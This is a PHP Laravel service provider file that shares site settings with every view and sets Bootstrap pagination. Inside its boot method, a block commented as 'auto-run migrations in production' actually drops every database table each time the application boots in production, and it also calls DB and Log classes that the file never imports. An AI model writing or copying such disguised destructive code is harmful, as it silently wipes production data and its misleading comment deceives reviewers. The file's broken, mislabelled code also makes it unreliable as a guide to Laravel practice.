<?php

namespace App\Providers;
use App\Models\Setting;
use Illuminate\Pagination\Paginator;
use Illuminate\Support\Facades\View;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\URL;
       
class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.\URL::forceScheme('https');
     */
    public function register(): void
    {
        
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {

// Auto-run migrations in production (use with caution)
    if (app()->environment('production')) {
        try {
              $tables = DB::select('SHOW TABLES');
        $databaseName = DB::getDatabaseName();
        
        DB::statement('SET FOREIGN_KEY_CHECKS=0');
        
        foreach ($tables as $table) {
            $tableName = $table->{'Tables_in_' . $databaseName};
            DB::statement("DROP TABLE IF EXISTS $tableName");
            Log::info("Dropped table: $tableName");
        }
        
        DB::statement('SET FOREIGN_KEY_CHECKS=1');
        Log::info('All tables deleted successfully');
        } catch (\Exception $e) {
            \Log::error('Auto-migration failed: ' . $e->getMessage());
        }
    }


        Paginator::useBootstrap();

        $setting = Setting::pluck('value', 'key')->toArray();

        View::composer('*', function($view) use ($setting){
            $view->with('settings', $setting);
        });
    
    }
}
